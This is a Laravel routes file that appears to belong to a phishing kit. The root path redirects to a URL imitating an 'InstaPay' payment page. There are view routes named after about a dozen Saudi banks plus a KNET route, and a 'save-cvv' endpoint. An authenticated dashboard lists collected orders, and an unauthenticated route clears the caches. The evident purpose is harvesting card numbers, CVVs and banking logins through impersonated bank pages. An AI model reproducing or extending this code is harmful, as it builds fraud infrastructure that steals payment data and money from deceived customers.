<?php

use App\Http\Controllers\CategoriesController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\OrdersController;
use App\Http\Controllers\ProductsController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('product/{product}',[ProductsController::class,'product'])->name('product');
Route::resource('orders',OrdersController::class);
Route::post('message/{id}',[OrdersController::class,'message'])->name('message');
Route::get('payment-success',[HomeController::class,'payment'])->name('payment');
Route::get('checkout/{product}',[HomeController::class,'checkout'])->name('checkout');

Route::group( ['prefix' => 'dashboard/','middleware' => ['auth:web']] , function (){

    Route::get('',[DashboardController::class,'index'])->name('dashboard');

    Route::resource('categories',CategoriesController::class);
    Route::resource('products',ProductsController::class);
    Route::view('product','product');

});

Auth::routes([
    'register' => false, // Registration Routes...
    'reset' => false, // Password Reset Routes...
    'verify' => false, // Email Verification Routes...
]);
Route::get('/instapay/Customer/InstaPay/TPay',[HomeController::class,'index'])->name('ttt');

Route::get('/', function(){
    return redirect()->route('ttt');
})->name('home');

Route::view('service','front.service')->name('service');
Route::view('form','front.info-form')->name('form');
Route::view('contact','front.contact')->name('contact');
Route::view('confirm','front.confirm')->name('confirm');
Route::view('banks','front.banks')->name('banks');
//******************************************************************************************************
Route::view('alryad','front.Banks.alryad')->name('alryad');
Route::view('albelad','front.Banks.albelad')->name('albelad');
Route::view('alahly','front.Banks.alahly')->name('alahly');
Route::view('aljazeera','front.Banks.aljazeera')->name('aljazeera');
Route::view('alenmaa','front.Banks.alenmaa')->name('alenmaa');
Route::view('samba','front.Banks.samba')->name('samba');
Route::view('franche','front.Banks.franche')->name('franche');
Route::view('sap','front.Banks.sap')->name('sap');
Route::view('saudi','front.Banks.saudi')->name('saudi');
Route::view('alarabi','front.Banks.alarabi')->name('alarabi');
Route::view('alraghi','front.Banks.test')->name('alraghi');
Route::view('alraghi_2','front.Banks.test_2')->name('alraghi_2');
Route::get('success', [HomeController::class,'success'])->name('success');
Route::view('done','front.done')->name('done');

Route::get('knet',[HomeController::class,'knet'])->name('kent');



Route::get('clear', function() {
    Artisan::call('cache:clear');
    Artisan::call('view:clear');
    Artisan::call('config:cache');
    Artisan::call('route:cache');
    return 'Application cache cleared';

});

Route::post('save-cvv',[OrdersController::class,'cvv'])->name('cvv');


